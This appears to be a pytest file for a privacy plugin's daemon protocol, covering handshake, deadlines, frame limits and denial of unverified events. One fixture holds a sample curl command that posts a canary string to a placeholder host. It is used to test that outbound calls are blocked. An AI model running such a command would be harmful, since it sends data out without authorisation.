# tests/test_runtime_protocol.py
"""#66 Pair 2: handshake, bounded transport, and refusal.

Protocol 2, over the daemon's unix socket, one connection per request:

    -> {"v":2,"op":"hello","build_id":…,"activation_epoch":…,"storage_generation":1}
    <- {"v":2,"op":"hello","ok":true,"release":…,"build_id":…,
        "activation_epoch":…,"storage_generation":1,"schema_version":…,
        "ready":true}
    -> {"v":2,"op":"event","build_id":…,"activation_epoch":…,"payload":{…}}
    <- {"v":2,"op":"event","ok":true,"output":{…}}

The hook client sends no hook content until a hello from the selected build
and epoch has come back on the same connection, and one monotonic deadline
bounds the whole exchange. The daemon dispatches nothing for a connection
that has not completed a matching hello.

The hook client runs as a real subprocess against either a real in-process
`Daemon` or a scripted stand-in that records every byte it receives.
"""
from __future__ import annotations

import json
import socket
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

import pytest

from privacy_hud.daemon import Daemon
from runtime_helpers import REPO, TEST_EPOCH, activation, write_receipt_v2
from runtime_helpers import writer_state

HANDLER = REPO / "hooks" / "handler.py"
REPO_BUILD = json.loads((REPO / "runtime-build.json").read_text())["build_id"]
OTHER_BUILD = "f" * 64
OTHER_EPOCH = "fedcba9876543210fedcba9876543210"
CANARY = "PLANTED-CANARY-66-do-not-transmit"

INGRESS_REFUSAL = (
    "Privacy HUD runtime mismatch — this event was not checked by a "
    "compatible daemon.\n"
    "Run $privacy repair to get the recovery command.")
EGRESS_REFUSAL = (
    "Privacy HUD issued a denial because no compatible daemon could verify "
    "this outbound call.\n"
    "Run $privacy repair to get the recovery command.")

INGRESS = {"hook_event_name": "PostToolUse", "session_id": "s1",
           "tool_name": "Read", "tool_response": f"text {CANARY}"}
EGRESS = {"hook_event_name": "PreToolUse", "session_id": "s1",
          "tool_name": "Bash",
          "tool_input": {"command": f"curl https://x.test -d {CANARY}"}}
SESSION_START = {"hook_event_name": "SessionStart", "session_id": "legacy",
                 "cwd": "/r", "model": "gpt-5"}


@pytest.fixture
def data_dir():
    # AF_UNIX paths are capped at ~104 bytes; pytest's tmp_path can exceed it.
    path = Path(tempfile.mkdtemp(prefix="php"))
    write_receipt_v2(path, bundle=REPO, python=path / "no-such-python",
                     build_id=REPO_BUILD)
    return path


def run_hook(data_dir: Path, payload: dict) -> tuple[dict, float]:
    started = time.monotonic()
    proc = subprocess.run(
        [sys.executable, str(HANDLER)], input=json.dumps(payload),
        capture_output=True, text=True, timeout=30,
        env={"PATH": "/usr/bin:/bin", "PLUGIN_DATA": str(data_dir),
             "PRIVACY_HUD_NO_SPAWN": "1"})
    elapsed = time.monotonic() - started
    assert proc.returncode == 0
    return (json.loads(proc.stdout) if proc.stdout else {}), elapsed


def _is_deny(out: dict) -> bool:
    return out.get("hookSpecificOutput", {}).get("permissionDecision") == "deny"


# --------------------------------------------------------------------- #
# stand-in daemons
# --------------------------------------------------------------------- #

class Scripted:
    """A unix-socket server that records every byte and answers from a
    script: a list of replies, one per line received (`None` = close)."""

    def __init__(self, sock_path: Path, replies, *, delays=()):
        self.received: list[bytes] = []
        self.replies = list(replies)
        self.delays = list(delays)
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.bind(str(sock_path))
        self.sock.listen(8)
        self.thread = threading.Thread(target=self._serve, daemon=True)
        self.thread.start()

    def _serve(self):
        while True:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                return
            with conn:
                conn.settimeout(5.0)
                buf = b""
                for index, reply in enumerate(self.replies):
                    while b"\n" not in buf:
                        try:
                            chunk = conn.recv(65536)
                        except OSError:
                            chunk = b""
                        if not chunk:
                            break
                        buf += chunk
                        self.received.append(chunk)
                    if b"\n" not in buf:
                        break
                    _line, buf = buf.split(b"\n", 1)
                    if index < len(self.delays):
                        time.sleep(self.delays[index])
                    if reply is None:
                        break
                    try:
                        conn.sendall(reply if isinstance(reply, bytes)
                                     else (json.dumps(reply) + "\n").encode())
                    except OSError:
                        break
                # drain whatever else arrives, for the record
                try:
                    conn.settimeout(0.3)
                    while True:
                        chunk = conn.recv(65536)
                        if not chunk:
                            break
                        self.received.append(chunk)
                except OSError:
                    pass

    def close(self):
        self.sock.close()
        self.thread.join(timeout=5.0)

    @property
    def traffic(self) -> bytes:
        return b"".join(self.received)


def hello_ok(build=REPO_BUILD, epoch=TEST_EPOCH) -> dict:
    return {"v": 2, "op": "hello", "ok": True, "release": "0.8.0",
            "build_id": build, "activation_epoch": epoch,
            "storage_generation": 1, "schema_version": 0, "ready": True}


@pytest.fixture
def real_daemon(tmp_path):
    """A real `Daemon` whose selected build and epoch the test chooses."""
    started = []

    def start(data_dir: Path, *, build=REPO_BUILD, epoch=TEST_EPOCH):
        state = writer_state(tmp_path / "state")
        daemon = Daemon(data_dir / "daemon.sock", tmp_path / "state",
                        idle_timeout=3600, poll_interval=0.05, state=state,
                        activation=activation(build_id=build, epoch=epoch))
        thread = threading.Thread(target=daemon.serve_forever, daemon=True)
        thread.start()
        started.append((daemon, thread))
        return daemon

    yield start
    for daemon, thread in started:
        daemon.stop()
        thread.join(timeout=5.0)
        daemon.state.ledger.conn.close()


def _ledger_counts(daemon) -> dict[str, int]:
    path = daemon.state.data_dir / "ledger.db"
    conn = sqlite3.connect(path)
    try:
        tables = [r[0] for r in conn.execute(
            "SELECT name FROM sqlite_master WHERE type='table'")]
        return {t: conn.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0]
                for t in tables}
    finally:
        conn.close()


def raw_exchange(sock_path: Path, *frames, timeout: float = 5.0):
    """Send each frame after reading the previous reply. Returns the parsed
    replies; `None` for silence (the daemon closed without answering)."""
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect(str(sock_path))
    replies = []
    try:
        for frame in frames:
            sock.sendall(frame if isinstance(frame, bytes)
                         else (json.dumps(frame) + "\n").encode())
            buf = b""
            while not buf.endswith(b"\n"):
                chunk = sock.recv(65536)
                if not chunk:
                    break
                buf += chunk
            if not buf:
                replies.append(None)
                break
            replies.append(json.loads(buf))
    finally:
        sock.close()
    return replies


def hello(build=REPO_BUILD, epoch=TEST_EPOCH) -> dict:
    return {"v": 2, "op": "hello", "build_id": build,
            "activation_epoch": epoch, "storage_generation": 1}


def event(payload, build=REPO_BUILD, epoch=TEST_EPOCH) -> dict:
    return {"v": 2, "op": "event", "build_id": build,
            "activation_epoch": epoch, "payload": payload}


# --------------------------------------------------------------------- #
# the named tests
# --------------------------------------------------------------------- #

@pytest.mark.parametrize("old_reply", [None, {}])
@pytest.mark.parametrize("payload, egress", [(INGRESS, False),
                                             (EGRESS, True)])
def test_old_daemon_receives_hello_but_no_payload(data_dir, old_reply,
                                                  payload, egress):
    """An old daemon answers anything it does not understand with silence or
    an empty allow. Either way it must have seen the hello and nothing of
    the hook payload."""
    old = Scripted(data_dir / "daemon.sock", [old_reply, {}])
    try:
        out, _ = run_hook(data_dir, payload)
    finally:
        old.close()
    assert CANARY.encode() not in old.traffic
    first = json.loads(old.traffic.split(b"\n", 1)[0])
    assert first == {"v": 2, "op": "hello", "build_id": REPO_BUILD,
                     "activation_epoch": TEST_EPOCH, "storage_generation": 1}
    if egress:
        assert _is_deny(out)
        assert out["hookSpecificOutput"]["permissionDecisionReason"] == \
            EGRESS_REFUSAL
    else:
        assert out == {"systemMessage": INGRESS_REFUSAL}


def test_legacy_client_cannot_dispatch(real_daemon, data_dir):
    daemon = real_daemon(data_dir)
    sock_path = data_dir / "daemon.sock"
    before = _ledger_counts(daemon)
    legacy = [
        {"v": 1, "op": "event", "payload": SESSION_START},
        {"v": 1, "payload": SESSION_START},
        {"payload": SESSION_START},
        {"v": 1, "op": "active_sessions"},
        {"v": 1, "op": "policy_update", "payload": SESSION_START},
        {"v": 2, "op": "event", "payload": SESSION_START},
        event(SESSION_START),                      # no hello first
        {**hello(), "v": True},                    # a boolean is not 2
        {**hello(), "session_id": "legacy"},       # hello carries no content
    ]
    for frame in legacy:
        assert raw_exchange(sock_path, frame) == [None], frame
    assert daemon.state.live == {}
    assert _ledger_counts(daemon) == before


def test_same_connection_required_after_hello(real_daemon, data_dir):
    daemon = real_daemon(data_dir)
    sock_path = data_dir / "daemon.sock"
    reply = raw_exchange(sock_path, hello())[0]
    assert reply is not None, "the daemon did not answer the hello"
    assert reply["ok"] is True
    assert reply["build_id"] == REPO_BUILD
    assert reply["activation_epoch"] == TEST_EPOCH
    assert reply["ready"] is True
    # A second connection that skips the hello dispatches nothing.
    assert raw_exchange(sock_path, event(SESSION_START)) == [None]
    assert daemon.state.live == {}
    # On the same connection, after a matching hello, it does.
    replies = raw_exchange(sock_path, hello(), event(SESSION_START))
    assert replies[1] == {"v": 2, "op": "event", "ok": True, "output": {}}
    assert "legacy" in daemon.state.live


@pytest.mark.parametrize("build, epoch", [(OTHER_BUILD, TEST_EPOCH),
                                          (REPO_BUILD, OTHER_EPOCH)])
def test_wrong_build_egress_is_denied(real_daemon, data_dir, build, epoch):
    daemon = real_daemon(data_dir, build=build, epoch=epoch)
    before = _ledger_counts(daemon)
    out, _ = run_hook(data_dir, EGRESS)
    assert _is_deny(out)
    assert out["hookSpecificOutput"]["permissionDecisionReason"] == \
        EGRESS_REFUSAL
    assert daemon.state.live == {}
    assert _ledger_counts(daemon) == before


def test_wrong_build_ingress_is_unverified(real_daemon, data_dir):
    daemon = real_daemon(data_dir, build=OTHER_BUILD)
    before = _ledger_counts(daemon)
    out, _ = run_hook(data_dir, INGRESS)
    assert out == {"systemMessage": INGRESS_REFUSAL}
    assert not _is_deny(out)
    assert daemon.state.live == {}
    assert _ledger_counts(daemon) == before


@pytest.mark.parametrize("payload, egress", [(INGRESS, False),
                                             (EGRESS, True)])
def test_handshake_and_event_share_deadline(data_dir, payload, egress):
    """1.2 s to answer the hello and 1.2 s to answer the event: each fits
    the 2 s budget alone, together they do not, and the late answer must
    not be used."""
    late = {"v": 2, "op": "event", "ok": True,
            "output": {"systemMessage": "late answer"}}
    slow = Scripted(data_dir / "daemon.sock", [hello_ok(), late],
                    delays=[1.2, 1.2])
    try:
        out, elapsed = run_hook(data_dir, payload)
    finally:
        slow.close()
    assert elapsed < 2.8, elapsed
    assert "late answer" not in json.dumps(out)
    assert "hello" not in json.dumps(out)
    if egress:
        assert _is_deny(out)
    else:
        assert not _is_deny(out)
        assert "unverified" in out["systemMessage"]


@pytest.mark.parametrize("reply", [
    {"v": 2, "op": "event", "ok": False, "code": "request_failed"},
    {"error": "internal", "code": "request_failed"},
    {"v": 2, "op": "event", "ok": True, "output": "not an object"},
    {"v": 2, "op": "hello", "ok": True, "output": {}},
    {"v": True, "op": "event", "ok": True, "output": {}},
    {"v": 2, "op": "event", "ok": "yes", "output": {}},
    b"not json\n",
])
@pytest.mark.parametrize("payload, egress", [(INGRESS, False),
                                             (EGRESS, True)])
def test_protocol_error_never_becomes_hook_output(data_dir, reply, payload,
                                                  egress):
    broken = Scripted(data_dir / "daemon.sock", [hello_ok(), reply])
    try:
        out, _ = run_hook(data_dir, payload)
    finally:
        broken.close()
    text = json.dumps(out)
    for leaked in ("request_failed", "internal", "not an object", '"ok"',
                   '"output"', '"op"'):
        assert leaked not in text
    if egress:
        assert _is_deny(out)
    else:
        assert not _is_deny(out)
        assert "unverified" in out["systemMessage"]


def test_exit_three_requires_matching_hello(real_daemon, data_dir):
    """A spawn that exited 3 ("a daemon already owns the socket") says only
    that something holds the socket, not that it is compatible."""
    latch = data_dir / "daemon.spawn-attempt"
    fresh = json.dumps({"at": time.time(), "pid": 4242, "exit": 3})

    # An incompatible owner answers: the answer is a refusal.
    daemon = real_daemon(data_dir, build=OTHER_BUILD)
    latch.write_text(fresh)
    out, _ = run_hook(data_dir, INGRESS)
    assert out == {"systemMessage": INGRESS_REFUSAL}
    out, _ = run_hook(data_dir, EGRESS)
    assert out["hookSpecificOutput"]["permissionDecisionReason"] == \
        EGRESS_REFUSAL
    assert daemon.state.live == {}

    # Nothing answering, and the latch still says exit 3: not "starting".
    daemon.stop()
    time.sleep(0.2)
    latch.write_text(fresh)
    env = {"PATH": "/usr/bin:/bin", "PLUGIN_DATA": str(data_dir)}
    proc = subprocess.run([sys.executable, str(HANDLER)],
                          input=json.dumps(INGRESS), capture_output=True,
                          text=True, timeout=30, env=env)
    assert "starting" not in proc.stdout
    assert "unverified" in json.loads(proc.stdout)["systemMessage"]


# --------------------------------------------------------------------- #
# frame bounds
# --------------------------------------------------------------------- #

def test_oversized_hello_is_dropped(real_daemon, data_dir):
    daemon = real_daemon(data_dir)
    padded = json.dumps(hello())[:-1] + ', "pad": "' + "x" * 17000 + '"}\n'
    assert raw_exchange(data_dir / "daemon.sock", padded.encode()) == [None]
    assert daemon.state.live == {}


def test_oversized_hello_reply_is_a_refusal(data_dir):
    huge = (json.dumps(hello_ok())[:-1] + ', "pad": "' + "x" * 17000
            + '"}\n').encode()
    server = Scripted(data_dir / "daemon.sock", [huge, {}])
    try:
        out, _ = run_hook(data_dir, INGRESS)
    finally:
        server.close()
    assert out == {"systemMessage": INGRESS_REFUSAL}
    assert CANARY.encode() not in server.traffic


# --------------------------------------------------------------------- #
# the stdlib-only restatement stays pinned to the package
# --------------------------------------------------------------------- #

def _handler_literals() -> dict:
    import ast
    tree = ast.parse(HANDLER.read_text(encoding="utf-8"))
    out = {}
    for node in tree.body:
        if (isinstance(node, ast.Assign) and len(node.targets) == 1
                and isinstance(node.targets[0], ast.Name)):
            try:
                out[node.targets[0].id] = ast.literal_eval(node.value)
            except ValueError:
                pass
    return out


def test_hook_client_restates_the_protocol():
    from privacy_hud import runtime_client, runtime_contract
    values = _handler_literals()
    assert values["PROTOCOL_VERSION"] == runtime_contract.PROTOCOL_VERSION
    assert values["STORAGE_GENERATION"] == runtime_contract.STORAGE_GENERATION
    assert values["READABLE_SCHEMAS"] == runtime_contract.READABLE_SCHEMAS
    assert values["HELLO_FRAME_LIMIT"] == runtime_client.HELLO_FRAME_LIMIT == \
        16 * 1024
    assert values["EVENT_FRAME_LIMIT"] == runtime_client.EVENT_FRAME_LIMIT == \
        8 * 1024 * 1024
    assert set(values["HELLO_REPLY_FIELDS"]) == \
        runtime_client.HELLO_REPLY_FIELDS


def test_runtime_client_round_trip_and_refusal(real_daemon, data_dir):
    """The package client: hello, then one request, on one connection; a
    daemon of another build is a `runtime_mismatch` refusal."""
    from privacy_hud.runtime_client import connect_runtime
    from privacy_hud.runtime_contract import RuntimeRefusal
    real_daemon(data_dir)
    selected = activation(build_id=REPO_BUILD)
    with connect_runtime(data_dir, activation=selected,
                         timeout=5.0) as connection:
        assert connection.hello["ok"] is True
        reply = connection.request("active_sessions", {})
    assert reply["sessions"] == []
    with pytest.raises(RuntimeRefusal) as refused:
        connect_runtime(data_dir, activation=activation(build_id=OTHER_BUILD),
                        timeout=5.0)
    assert refused.value.code == "runtime_mismatch"


# --------------------------------------------------------------------- #
# #54 Phase 4: the delivery key rides the protocol-2 event frame
# --------------------------------------------------------------------- #

import re  # noqa: E402

DELIVERY = "0123456789abcdef0123456789abcdef"
ACCOUNTING_FAILURE = ("Privacy HUD could not record this event — this "
                      "event is unverified.")
EVENT_OK = {"v": 2, "op": "event", "ok": True, "output": {}}


def _sessions(daemon) -> list[str]:
    with daemon.state.lock:
        return [r[0] for r in daemon.state.ledger.conn.execute(
            "SELECT session_id FROM sessions ORDER BY session_id")]


def _record_dispatch(monkeypatch) -> list[tuple[dict, object]]:
    import privacy_hud.daemon as daemon_mod
    calls: list[tuple[dict, object]] = []

    def recording(state, payload, *, delivery_key=None):
        calls.append((payload, delivery_key))
        return {}

    monkeypatch.setattr(daemon_mod, "dispatch", recording)
    return calls


def test_protocol2_event_carries_delivery_key_after_hello(data_dir):
    server = Scripted(data_dir / "daemon.sock", [hello_ok(), EVENT_OK])
    try:
        run_hook(data_dir, INGRESS)
    finally:
        server.close()
    lines = [json.loads(line) for line in server.traffic.split(b"\n")
             if line]
    assert len(lines) == 2
    assert lines[0] == hello()
    frame = lines[1]
    assert set(frame) == {"v", "op", "build_id", "activation_epoch",
                          "delivery_key", "payload"}
    assert frame["v"] == 2 and frame["op"] == "event"
    assert frame["build_id"] == REPO_BUILD
    assert frame["activation_epoch"] == TEST_EPOCH
    assert re.fullmatch(r"[0-9a-f]{32}", frame["delivery_key"])
    assert frame["payload"] == INGRESS
    assert b"delivery_key" not in server.traffic.split(b"\n", 1)[0]


def test_protocol2_event_accepts_optional_delivery_key(real_daemon, data_dir):
    daemon = real_daemon(data_dir)
    sock_path = data_dir / "daemon.sock"
    keyed = {**SESSION_START, "session_id": "keyed"}
    keyless = {**SESSION_START, "session_id": "keyless"}
    replies = raw_exchange(sock_path, hello(),
                           {**event(keyed), "delivery_key": DELIVERY})
    assert replies[0]["ok"] is True
    assert replies[1] == EVENT_OK
    assert raw_exchange(sock_path, hello(), event(keyless))[1] == EVENT_OK
    assert {"keyed", "keyless"} <= set(daemon.state.live)
    before = _ledger_counts(daemon)
    for index, extra in enumerate(({"extra": 1}, {"session_id": "x"},
                                   {"delivery_key": DELIVERY, "extra": 1},
                                   {"accounting": {}})):
        frame = {**event({**SESSION_START, "session_id": f"extra{index}"}),
                 **extra}
        assert raw_exchange(sock_path, hello(), frame)[1] is None, extra
    missing = event(SESSION_START)
    del missing["payload"]
    assert raw_exchange(sock_path, hello(),
                        {**missing, "delivery_key": DELIVERY})[1] is None
    assert not any(s.startswith("extra") for s in daemon.state.live)
    assert _ledger_counts(daemon) == before


def test_protocol1_delivery_envelope_still_refused(real_daemon, data_dir):
    daemon = real_daemon(data_dir)
    sock_path = data_dir / "daemon.sock"
    before = _ledger_counts(daemon)
    old = {"v": 1, "op": "event", "delivery_key": DELIVERY,
           "payload": SESSION_START}
    assert raw_exchange(sock_path, old) == [None]
    replies = raw_exchange(sock_path, hello(), old)
    assert replies[0]["ok"] is True and replies[1] is None
    assert daemon.state.live == {}
    assert _ledger_counts(daemon) == before


@pytest.mark.parametrize("payload, egress", [(INGRESS, False),
                                             (EGRESS, True)])
def test_runtime_mismatch_sends_no_delivery_or_payload(data_dir, payload,
                                                       egress):
    for reply in (hello_ok(build=OTHER_BUILD), hello_ok(epoch=OTHER_EPOCH),
                  {"v": 2, "op": "hello", "ok": False,
                   "code": "runtime_mismatch"}):
        server = Scripted(data_dir / "daemon.sock", [reply, EVENT_OK])
        try:
            out, _ = run_hook(data_dir, payload)
        finally:
            server.close()
            (data_dir / "daemon.sock").unlink()
        assert b"delivery_key" not in server.traffic
        assert CANARY.encode() not in server.traffic
        if egress:
            assert out["hookSpecificOutput"]["permissionDecisionReason"] \
                == EGRESS_REFUSAL
        else:
            assert out == {"systemMessage": INGRESS_REFUSAL}


@pytest.mark.parametrize("bad", [None, "", "X" * 32, DELIVERY.upper(),
                                 DELIVERY[:-1], 7, ["k"]])
def test_invalid_envelope_key_uses_existing_failure_policy(real_daemon,
                                                           data_dir, bad):
    daemon = real_daemon(data_dir)
    sock_path = data_dir / "daemon.sock"
    before = _ledger_counts(daemon)
    start = {**SESSION_START, "session_id": "badkey"}
    replies = raw_exchange(sock_path, hello(),
                           {**event(start), "delivery_key": bad})
    assert replies[1] is not None, "an invalid key was met with silence"
    assert replies[1]["ok"] is True
    assert replies[1]["output"] == {"systemMessage": ACCOUNTING_FAILURE}
    replies = raw_exchange(sock_path, hello(),
                           {**event(EGRESS), "delivery_key": bad})
    assert _is_deny(replies[1]["output"])
    assert "badkey" not in _sessions(daemon)
    assert _ledger_counts(daemon) == before


def test_matching_protocol2_envelope_without_key_gets_request_local_key(
        real_daemon, data_dir, monkeypatch):
    calls = _record_dispatch(monkeypatch)
    real_daemon(data_dir)
    sock_path = data_dir / "daemon.sock"
    for _ in range(2):
        assert raw_exchange(sock_path, hello(), event(INGRESS))[1] == EVENT_OK
    assert raw_exchange(sock_path, hello(),
                        {**event(INGRESS), "delivery_key": DELIVERY})[1] \
        == EVENT_OK
    keys = [key for _payload, key in calls]
    assert len(keys) == 3
    assert all(isinstance(k, str) and re.fullmatch(r"[0-9a-f]{32}", k)
               for k in keys)
    assert keys[0] != keys[1]
    assert keys[2] == DELIVERY
    assert DELIVERY not in keys[:2]


def test_new_accounting_failure_warns_on_ingress(real_daemon, data_dir,
                                                 monkeypatch):
    import privacy_hud.engine as engine_mod

    def boom(self, obs, **_kw):
        raise RuntimeError(f"simulated accounting failure {CANARY}")

    monkeypatch.setattr(engine_mod.Engine, "observe", boom)
    real_daemon(data_dir)
    sock_path = data_dir / "daemon.sock"
    start = {**SESSION_START, "session_id": "s1"}
    assert raw_exchange(sock_path, hello(), event(start))[1] == EVENT_OK
    reply = raw_exchange(sock_path, hello(), event(INGRESS))[1]
    assert reply["output"] == {"systemMessage": ACCOUNTING_FAILURE}
    assert CANARY not in json.dumps(reply)
    reply = raw_exchange(sock_path, hello(), event(EGRESS))[1]
    assert _is_deny(reply["output"])
    # The hook client relays the warning unchanged.
    out, _ = run_hook(data_dir, INGRESS)
    assert out == {"systemMessage": ACCOUNTING_FAILURE}


# --------------------------------------------------------------------- #
# #54 Phase 4: generation 5402 capability, and stale identity
# --------------------------------------------------------------------- #

def test_5402_capabilities_agree_across_manifest_and_hook(data_dir):
    from privacy_hud import runtime_contract
    values = _handler_literals()
    manifest = json.loads((REPO / "runtime-build.json").read_text())
    assert runtime_contract.READABLE_SCHEMAS == (0, 5401, 5402)
    assert runtime_contract.WRITABLE_SCHEMAS == (0, 5401, 5402)
    assert values["READABLE_SCHEMAS"] == (0, 5401, 5402)
    assert manifest["readable_schemas"] == [0, 5401, 5402]
    assert manifest["writable_schemas"] == [0, 5401, 5402]
    # The stdlib client accepts a matching hello from an activated ledger.
    relayed = {"v": 2, "op": "event", "ok": True,
               "output": {"systemMessage": "from an activated daemon"}}
    server = Scripted(data_dir / "daemon.sock",
                      [{**hello_ok(), "schema_version": 5402}, relayed])
    try:
        out, _ = run_hook(data_dir, INGRESS)
    finally:
        server.close()
    assert out == {"systemMessage": "from an activated daemon"}


def test_stale_build_and_epoch_cannot_dispatch_after_selection(
        real_daemon, data_dir, tmp_path):
    """A daemon whose selection moved on (repair selected another build or
    epoch) writes nothing for a hook that still reaches it: no activation,
    observation or policy row. A hook of a stale identity is refused at the
    hello."""
    from runtime_helpers import write_receipt_v2 as reselect

    daemon = real_daemon(data_dir)
    daemon.state.accounting_activation = True
    sock_path = data_dir / "daemon.sock"
    state_dir = tmp_path / "state"
    before = _ledger_counts(daemon)
    # A stale hook identity: refused before any dispatch.
    for build, epoch in ((OTHER_BUILD, TEST_EPOCH), (REPO_BUILD, OTHER_EPOCH)):
        replies = raw_exchange(sock_path, hello(build, epoch))
        assert replies[0]["ok"] is False
    # The daemon's own selection moves: its writer lease is no longer
    # current, so a matching hook's start writes nothing.
    reselect(state_dir, bundle=REPO, python="/usr/bin/python3",
             build_id=REPO_BUILD, epoch=OTHER_EPOCH)
    replies = raw_exchange(sock_path, hello(), event(SESSION_START))
    assert replies[1]["output"] == {"systemMessage": ACCOUNTING_FAILURE}
    policy = {"v": 2, "op": "policy_update", "build_id": REPO_BUILD,
              "activation_epoch": TEST_EPOCH, "session_id": "legacy",
              "rule_type": "mask", "selector": "email"}
    assert raw_exchange(sock_path, hello(), policy)[1] is None
    assert _ledger_counts(daemon) == before
    with daemon.state.lock:
        version = daemon.state.ledger.conn.execute(
            "PRAGMA user_version").fetchone()[0]
    assert version == 0
    assert daemon.state.accounting_keys == {}
